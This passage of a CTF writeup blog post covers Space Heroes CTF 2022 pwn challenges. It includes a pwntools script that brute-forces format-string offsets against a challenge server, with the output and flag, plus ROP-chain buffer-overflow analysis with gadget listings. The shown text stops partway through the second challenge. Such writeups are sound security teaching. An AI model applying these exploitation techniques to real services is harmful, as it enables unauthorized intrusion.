<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="theme-color" content="#171717">
    <script src="https://kit.fontawesome.com/129342a70b.js" crossorigin="anonymous"></script>
    

    <meta name="description" content="Learn brute-forced format string attacks, blind buffer overflows, and return-oriented programming in this writeup compilation from Space Heroes CTF.">
<meta property="og:type" content="article">
<meta property="og:title" content="Space Heroes CTF: Writeup Compilation">
<meta property="og:url" content="https://enscribe.dev/blog/shctf-2022/writeup-compilation/index.html">
<meta property="og:site_name" content="enscribe.dev">
<meta property="og:description" content="Learn brute-forced format string attacks, blind buffer overflows, and return-oriented programming in this writeup compilation from Space Heroes CTF.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://enscribe.dev/static/shctf-2022/banner.png">
<meta property="article:published_time" content="2022-04-06T17:33:54.000Z">
<meta property="article:modified_time" content="2023-08-30T18:25:56.294Z">
<meta property="article:author" content="enscribe">
<meta property="article:tag" content="compilation">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://enscribe.dev/static/shctf-2022/banner.png">
    
    
      
        
          <link rel="shortcut icon" href="/static/favicon.png">
        
      
      
        
          <link rel="icon" type="image/png" href="/static/favicon.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/static/favicon.png">
        
      
    
    <!-- title -->
    <title>Space Heroes CTF: Writeup Compilation</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">home</a></li><!--
     --><!--
       --><li><a href="/articles/">posts</a></li><!--
     --><!--
       --><li><a href="/ctfs/">ctfs</a></li><!--
     --><!--
       --><li><a href="/profiles/">profiles</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="previous post" href="/blog/byuctf-2022/osint-compilation/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">previous post</span>
      <span id="i-next" class="info" style="display:none;">next post</span>
      <span id="i-top" class="info" style="display:none;">back to top</span>
      <span id="i-share" class="info" style="display:none;">share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://enscribe.dev/blog/shctf-2022/writeup-compilation/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://enscribe.dev/blog/shctf-2022/writeup-compilation/&text=Space Heroes CTF: Writeup Compilation"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://enscribe.dev/blog/shctf-2022/writeup-compilation/&title=Space Heroes CTF: Writeup Compilation"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://enscribe.dev/blog/shctf-2022/writeup-compilation/&is_video=false&description=Space Heroes CTF: Writeup Compilation"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Space Heroes CTF: Writeup Compilation&body=Check out this article: https://enscribe.dev/blog/shctf-2022/writeup-compilation/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://enscribe.dev/blog/shctf-2022/writeup-compilation/&title=Space Heroes CTF: Writeup Compilation"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://enscribe.dev/blog/shctf-2022/writeup-compilation/&name=Space Heroes CTF: Writeup Compilation&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guardians-of-the-Galaxy"><span class="toc-number"></span> <span class="toc-text">Guardians of the Galaxy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vader"><span class="toc-number"></span> <span class="toc-text">Vader</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Warmup-to-the-Dark-Side"><span class="toc-number"></span> <span class="toc-text">Warmup to the Dark Side</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rahool's-Challenge"><span class="toc-number"></span> <span class="toc-text">Rahool&#39;s Challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Vigenere-Cipher"><span class="toc-number">1.</span> <span class="toc-text">The Vigenère Cipher</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cheaters-Never-Win%E2%80%A6"><span class="toc-number">2.</span> <span class="toc-text">Cheaters Never Win…</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%A6Or-Do-They"><span class="toc-number">3.</span> <span class="toc-text">…Or Do They?</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Space Heroes CTF: Writeup Compilation
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">enscribe</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-04-06T17:33:54.000Z" itemprop="datePublished">Apr 06, 2022</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/blog/">blog</a> › <a class="category-link" href="/categories/blog/shctf-2022/">shctf-2022</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/compilation/" rel="tag">compilation</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><img src="/static/shctf-2022/banner.svg" alt="Banner"></p>
<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>So me and a couple of LFGs (looking-for-groups) played <a target="_blank" rel="noopener" href="https://ctftime.org/event/1567/">Space Heroes CTF</a>, organized by Florida Tech’s <a target="_blank" rel="noopener" href="https://ctftime.org/team/65296">FITSEC</a> cybersecurity team. As one of the first CTFs I’ve played in over a year, it was an amazing learning experience for me being thrown into the mystical world of binary exploitation&#x2F;pwn. I’ve made a couple of writeups for the cooler challenges I’ve solved; enjoy!</p>
<hr>
<div class="challenge">
    <div class="challenge-title"><h2 id="Guardians-of-the-Galaxy" class="chal-title"><a href="#Guardians-of-the-Galaxy" class="headerlink" title="Guardians of the Galaxy"></a>Guardians of the Galaxy</h2></div>
    <div style="display:flex;" class="no-highlight">
        <div class="challenge-info">
            <div class="center-align">
                <i class="fa-solid fa-user fa-fw"></i> <b>solver</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: GlitchArchetype<br>
                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: pwn<br>
                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 100<br>
                
                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a href="/static/shctf-2022/guardians">guardians</a> (ELF)<br>
            </div>
        </div>
        <div class="challenge-description">
            <div class="center-align" style="font-size: 110%">
                Ronan the Accuser has the Power Stone. Can Starlord find a successful distraction format?<br />
<code>nc 0.cloud.chals.io 12690</code>
                
            </div>
        </div>
    </div>
    </div>

<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><figcaption><span>checksec.sh</span><a target="_blank" rel="noopener" href="https://github.com/slimm609/checksec.sh"><span>[github link]</span></a></figcaption><tr><td class="code"><pre><span class="meta prompt_">$ </span>checksec guardians
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/shctf/pwn/guardians-of-the-galaxy/guardians&apos;
    Arch:     amd64-64-little
    RELRO:    <span style="color:#5EBDAB">Full RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#5EBDAB">NX enabled</span>
    PIE:      <span style="color:#5EBDAB">PIE enabled</span></pre></td></tr></table></div>

<p>Let’s look at what happens when you run that binary given to us.</p>
<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>./guardians 
Error, please message admins with 'infinity_error'.</pre></td></tr></table></div>

<p>This error is because the binary is probably trying to reference a <code>flag.txt</code> within its directory that doesn’t exist. Let’s create one and run it again:</p>
<div><figure class="highlight console" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">touch</span> flag.txt &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;FLAGHERE&quot;</span> &gt; flag.txt</span>
<span class="meta prompt_">$ </span><span class="language-bash">./guardians</span>
Does Quill manage to win the dance battle?</pre></td></tr></table></div>

<p>There, we got it to work locally. Since we know that this is problem a format string vulnerability from the “find a successful distraction format” part of the description, let’s assume that the vulnerability is it writing our input to the stack with <code>printf()</code>. We will need to work our way up the stack with the format <code>%n$s</code>, where <code>n</code> is the decimal index of the argument you want, and <code>s</code> is the <code>printf()</code> specifier for a <strong>string of characters</strong>. Here is a Python script used to brute force our way up:</p>
<div><figure class="highlight py" style=""><table><figcaption><span>guardians.py</span><a target="_blank" rel="noopener" href="https://gist.github.com/jktrn/abced39a897e40c196dc2eb3348e1db9"><span>[github gist link]</span></a></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="keyword">from</span> pwn <span class="keyword">import</span> *
<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):
        p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">12690</span>)  
        log.info(<span class="string">f&quot;Trying offset <span class="subst">{i}</span>...&quot;</span>)
        p.sendline(<span class="built_in">bytes</span>((<span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;$s&#x27;</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))

        output = p.recvS()
        <span class="keyword">if</span> <span class="string">&#x27;shctf&#x27;</span> <span class="keyword">in</span> output:
                log.success(output)
                <span class="keyword">break</span>
        p.close()</pre></td></tr></table></div>

<p>As you can see, it will send a UTF-8 encoded format string, with <code>str(i)</code> being the looping variable. If its output contains the flag, the loop breaks and the script will stop. Let’s run it:</p>
<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>python3 exp.py
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 0...
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 1...
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 2...
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 3...
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 4...
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 5...
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 6...
[<span style="color:#47D4B9"><b>+</b></span>] Does Quill manage to win the dance battle?
    Oh no, Ronano has seen through the distraction!
<div class="code-highlight">    shctf&#123;im_distracting_you&#125;</div></pre></td></tr></table></div>

<hr>
<div class="challenge">
    <div class="challenge-title"><h2 id="Vader" class="chal-title"><a href="#Vader" class="headerlink" title="Vader"></a>Vader</h2></div>
    <div style="display:flex;" class="no-highlight">
        <div class="challenge-info">
            <div class="center-align">
                <i class="fa-solid fa-user fa-fw"></i> <b>solver</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: v10l3nt<br>
                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: pwn<br>
                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 100<br>
                
                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a href="/static/shctf-2022/vader">vader</a> (ELF)<br>
            </div>
        </div>
        <div class="challenge-description">
            <div class="center-align" style="font-size: 110%">
                Submit flag from <code>/flag.txt</code> from <code>0.cloud.chals.io:20712</code>
                
            </div>
        </div>
    </div>
    </div>

<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><figcaption><span>checksec.sh</span><a target="_blank" rel="noopener" href="https://github.com/slimm609/checksec.sh"><span>[github link]</span></a></figcaption><tr><td class="code"><pre><span class="meta prompt_">$ </span>checksec vader
[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/shctf/pwn/vader/vader'
    Arch:     amd64-64-little</span>
    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#5EBDAB">NX enabled</span>
    PIE:      <span style="color:#D41919">No PIE (0x400000)</span></pre></td></tr></table></div>

<p>As with any binary-only challenge, the first thing we must do is boot it up in the <strong>Ghidra</strong> disassembler for basic analysis. Let’s check what our <code>main()</code> function does:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">char</span> local_28 [<span class="number">32</span>];</span><br><span class="line">  </span><br><span class="line">  print_darth();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\nWhen I left you, I was but the learner. Now I am the master &gt;&gt;&gt; &quot;</span>);</span><br><span class="line">  fgets(local_28,<span class="number">0x100</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Looks like it reads our input (<code>stdin</code>) with a fixed length of 256 through <code>fgets()</code>. Let’s continue sifting around:</p>
<div><figure class="highlight c" style=""><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="type">void</span> <span class="title function_">vader</span><span class="params">(<span class="type">char</span> *param_1,<span class="type">char</span> *param_2,<span class="type">char</span> *param_3,<span class="type">char</span> *param_4,<span class="type">char</span> *param_5)</span> {
  <span class="type">int</span> iVar1;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  FILE *local_10;
  
  iVar1 = <span class="built_in">strcmp</span>(param_1,<span class="string">&quot;DARK&quot;</span>);
  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) {
    iVar1 = <span class="built_in">strcmp</span>(param_2,<span class="string">&quot;S1D3&quot;</span>);
    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) {
      iVar1 = <span class="built_in">strcmp</span>(param_3,<span class="string">&quot;OF&quot;</span>);
      <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) {
        iVar1 = <span class="built_in">strcmp</span>(param_4,<span class="string">&quot;TH3&quot;</span>);
        <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) {
          iVar1 = <span class="built_in">strcmp</span>(param_5,<span class="string">&quot;FORC3&quot;</span>);
          <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) {
            local_38 = <span class="number">0</span>;
            local_30 = <span class="number">0</span>;
            local_28 = <span class="number">0</span>;
            local_20 = <span class="number">0</span>;
            local_10 = (FILE *)<span class="number">0x0</span>;
            local_10 = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);
            fgets((<span class="type">char</span> *)&amp;local_38,<span class="number">0x30</span>,local_10);
            <span class="built_in">printf</span>(<span class="string">&quot;&lt;&lt;&lt; %s\n&quot;</span>,&amp;local_38);
          }
        }
      }
    }
    <span class="keyword">else</span> {
      <span class="built_in">printf</span>(<span class="string">&quot;You are a wretched thing, of weakness and fear.&quot;</span>);
    }
    <span class="built_in">exit</span>(<span class="number">1</span>);
  }
  <span class="keyword">return</span>;
}</pre></td></tr></table></div>

<p>The goal is now clear: call the <code>vader()</code> function with five correct arguments to print the flag. Simple, right? Let’s start building our chain.</p>
<p>Firstly, we need to calculate our <strong>offset</strong>. Although we can brute this by simply passing a <code>cyclic</code> string and seeing what’s overwritten the <code>$rsp</code> register, we can see that in the <code>main()</code> function, 32 bytes are allocated to <code>char local_28</code>. We can assume this is the buffer, so if we overflow this and append an additional 8 bytes to cover the <code>$rbp</code> register, our offset is 40.</p>
<p>Next in line is the process of getting our arguments on the stack. Arguments to be passed into functions are also held in registers – we need to figure out which ones we need to use to pass the correct arguments (<code>DARK</code>, <code>S1D3</code>, <code>OF</code>, <code>TH3</code>, <code>FORC3</code>) into <code>vader()</code>. Referencing <a target="_blank" rel="noopener" href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf">this x64 cheatsheet</a> (as the registers are different depending on the bitness&#x2F;architecture of the ELF):</p>
<blockquote>
<p>To call a function, the program should place the first six integer or pointer parameters in the registers <code>$rdi</code>, <code>$rsi</code>, <code>$rdx</code>, <code>$rcx</code>, <code>$r8</code>, and <code>$r9</code>; subsequent parameters (or parameters larger than 64 bits) should be pushed onto the stack, with the first argument topmost. The program should then execute the call instruction, which will push the return address onto the stack and jump to the start of the specified function.</p>
</blockquote>
<p>Therefore, we need to put our arguments into <code>$rdi</code>, <code>$rsi</code>, <code>$rdx</code>, <code>$rcx</code>, and <code>$r8</code>. The main method of doing this is via <strong>gadgets</strong>, or simple assembly instructions that can be used to <code>pop</code> specific registers from the stack. After the <code>pop</code>, we can repopulate the register with our own address that represents the required string (this address will be located within the binary). Additionally, they almost always have a <code>ret</code> instruction at the end to return to <em>even more</em> gadgets, therefore creating a <strong>ROP chain</strong>.</p>
<p><strong>Note</strong>: The program literally provides gadget functions for you:</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">00000000004011c9</span> <span class="string">&lt;gadget1&gt;:</span></span><br><span class="line">  <span class="attr">4011c9</span>: <span class="string">55                    push   rbp</span></span><br><span class="line">  <span class="attr">4011ca</span>: <span class="string">48 89 e5              mov    rbp,rsp</span></span><br><span class="line">  <span class="attr">4011cd</span>: <span class="string">59                    pop    rcx</span></span><br><span class="line">  <span class="attr">4011ce</span>: <span class="string">5a                    pop    rdx</span></span><br><span class="line">  <span class="attr">4011cf</span>: <span class="string">c3                    ret    </span></span><br><span class="line">  <span class="attr">4011d0</span>: <span class="string">90                    nop</span></span><br><span class="line">  <span class="attr">4011d1</span>: <span class="string">5d                    pop    rbp</span></span><br><span class="line">  <span class="attr">4011d2</span>: <span class="string">c3                    ret    </span></span><br><span class="line"></span><br><span class="line"><span class="attr">00000000004011d3</span> <span class="string">&lt;gadget2&gt;:</span></span><br><span class="line">  <span class="attr">4011d3</span>: <span class="string">55                    push   rbp</span></span><br><span class="line">  <span class="attr">4011d4</span>: <span class="string">48 89 e5              mov    rbp,rsp</span></span><br><span class="line">  <span class="attr">4011d7</span>: <span class="string">41 59                 pop    r9</span></span><br><span class="line">  <span class="attr">4011d9</span>: <span class="string">41 58                 pop    r8</span></span><br><span class="line">  <span class="attr">4011db</span>: <span class="string">c3                    ret    </span></span><br><span class="line">  <span class="attr">4011dc</span>: <span class="string">90                    nop</span></span><br><span class="line">  <span class="attr">4011dd</span>: <span class="string">5d                    pop    rbp</span></span><br><span class="line">  <span class="attr">4011de</span>: <span class="string">c3                    ret    </span></span><br></pre></td></tr></table></figure>

<p>Although you can use these, it’s not really in the nature of a ROP challenge, so I will be finding the gadgets manually!</p>
<p>To find the gadgets we need, we will be utilizing a program called <code>ropper</code> and <code>grep</code>-ing the output:</p>
<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><figcaption><span>ropper.py usage</span><a target="_blank" rel="noopener" href="https://www.kali.org/tools.ropper"><span>[documentation]</span></a></figcaption><tr><td class="code"><pre><span class="meta prompt_">$ </span>ropper -f vader | grep &quot;rdi&quot;
<span style="color:#5EBDAB">[INFO]</span> Load gadgets from cache
<span style="color:#5EBDAB">[LOAD]</span> loading... <span style="color:#E6E6E6">100%</span>
<span style="color:#5EBDAB">[LOAD]</span> removing double gadgets... <span style="color:#E6E6E6">100%</span>
<span style="color:#D41919">0x000000000040145e</span>: <span style="color:#FF8A18"><b>add</b></span> <span style="color:#E6E6E6">byte ptr [rax], al</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, rax<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">0x1030</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>nop</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>pop</b></span> <span style="color:#E6E6E6">rbp</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004011bc</span>: <span style="color:#FF8A18"><b>add</b></span> <span style="color:#E6E6E6">byte ptr [rax], al</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, rax<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">0x1040</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>nop</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>pop</b></span> <span style="color:#E6E6E6">rbp</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004015e9</span>: <span style="color:#FF8A18"><b>add</b></span> <span style="color:#E6E6E6">byte ptr [rax], al</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, rax<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">0x1060</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>mov</b></span> <span style="color:#E6E6E6">eax, 0</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>leave</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004010b7</span>: <span style="color:#FF8A18"><b>mov</b></span> <span style="color:#E6E6E6">ecx, 0x401600</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, 0x4015b5<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">qword ptr [rip + 0x3f26]</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>hlt</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>nop</b></span> <span style="color:#E6E6E6">dword ptr [rax + rax]</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004010b6</span>: <span style="color:#FF8A18"><b>mov</b></span> <span style="color:#E6E6E6">rcx, 0x401600</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, 0x4015b5<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">qword ptr [rip + 0x3f26]</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>hlt</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>nop</b></span> <span style="color:#E6E6E6">dword ptr [rax + rax]</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004010bd</span>: <span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, 0x4015b5<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">qword ptr [rip + 0x3f26]</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>hlt</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>nop</b></span> <span style="color:#E6E6E6">dword ptr [rax + rax]</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
